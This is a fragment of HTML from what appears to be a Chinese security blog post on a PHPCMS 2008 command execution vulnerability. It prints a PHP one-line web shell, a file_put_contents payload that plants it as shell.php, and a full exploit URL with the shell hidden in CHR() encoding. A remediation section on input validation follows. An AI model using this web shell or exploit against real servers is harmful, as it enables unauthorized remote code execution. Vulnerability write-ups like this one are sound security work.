class="string">"."</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> output</span><br></pre></td></tr></table></figure>
-<p>一句话：<code>&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;</code></p>
-<p>不要菜刀连接：<code>file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;&#39;);</code></p>
-<p>故访问：<code>http://xx.xx.xx.xx/yp/web/index.php?userid=abc&amp;menu=file_put_contents(CHR(115).CHR(104).CHR(101).CHR(108).CHR(108).CHR(46).CHR(112).CHR(104).CHR(112),CHR(60).CHR(63).CHR(112).CHR(104).CHR(112).CHR(32).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(71).CHR(69).CHR(84).CHR(91).CHR(102).CHR(117).CHR(110).CHR(93).CHR(40).CHR(36).CHR(95).CHR(71).CHR(69).CHR(84).CHR(91).CHR(99).CHR(109).CHR(100).CHR(93).CHR(41).CHR(41).CHR(59).CHR(32).CHR(63).CHR(62));exit();</code></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对命令执行漏洞的修复应注意以下几点：</p>
-<ul>
-<li>所有输入都是可疑的，尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数的参数不允许外部传递。</li>
-<li>不仅要验证数据的类型，还要验证其格式、长度、范围和内容。</li>
-<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
-<li>对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</li>
-</ul>
-<h4 id=""><a href="#" class="headerlink" title=" "></a> </h4>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/02/PHPCMS-2008-命令执行漏洞/">展开全文 >></a>
         </p>
       
 
